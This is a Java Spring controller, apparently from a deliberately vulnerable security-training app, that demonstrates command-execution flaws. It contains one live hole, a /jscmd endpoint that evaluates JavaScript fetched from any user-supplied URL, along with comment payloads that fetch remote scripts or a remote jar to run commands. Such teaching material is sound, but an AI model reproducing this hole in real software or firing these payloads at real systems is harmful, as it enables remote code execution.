package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Set<String> ALLOWED_COMMANDS = Collections.unmodifiableSet(
            new HashSet<>(Arrays.asList("ls", "whoami", "date", "uptime", "hostname", "id", "uname", "pwd"))
    );

    /**
     * Validates that the command is in the allowlist.
     * Returns the canonical command name or null if rejected.
     */
    private static String validateCommand(String cmd) {
        if (cmd == null || cmd.trim().isEmpty()) {
            return null;
        }
        String trimmed = cmd.trim();
        if (!ALLOWED_COMMANDS.contains(trimmed)) {
            return null;
        }
        return trimmed;
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        String safeCmd = validateCommand(cmd);
        if (safeCmd == null) {
            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
        }
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            // Use array form to avoid shell interpretation
            Process p = run.exec(new String[]{safeCmd});
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
        String safeCmd = validateCommand(cmd);
        if (safeCmd == null) {
            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use argument array without shell to prevent injection
            ProcessBuilder processBuilder = new ProcessBuilder(safeCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Use SecureASTCustomizer to restrict dangerous operations
        SecureASTCustomizer secureASTCustomizer = new SecureASTCustomizer();
        secureASTCustomizer.setDisallowedImports(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder",
                "java.io.File", "java.lang.System",
                "java.lang.reflect.*"
        ));
        secureASTCustomizer.setIndirectImportCheckEnabled(true);
        secureASTCustomizer.setDisallowedReceiversClasses(Arrays.asList(
                (Class) Runtime.class, (Class) ProcessBuilder.class,
                (Class) System.class, (Class) Class.class
        ));
        // Disallow method execution on Runtime, Process, etc.
        secureASTCustomizer.setReceiversClassesAreAllowed(false);

        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secureASTCustomizer);

        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

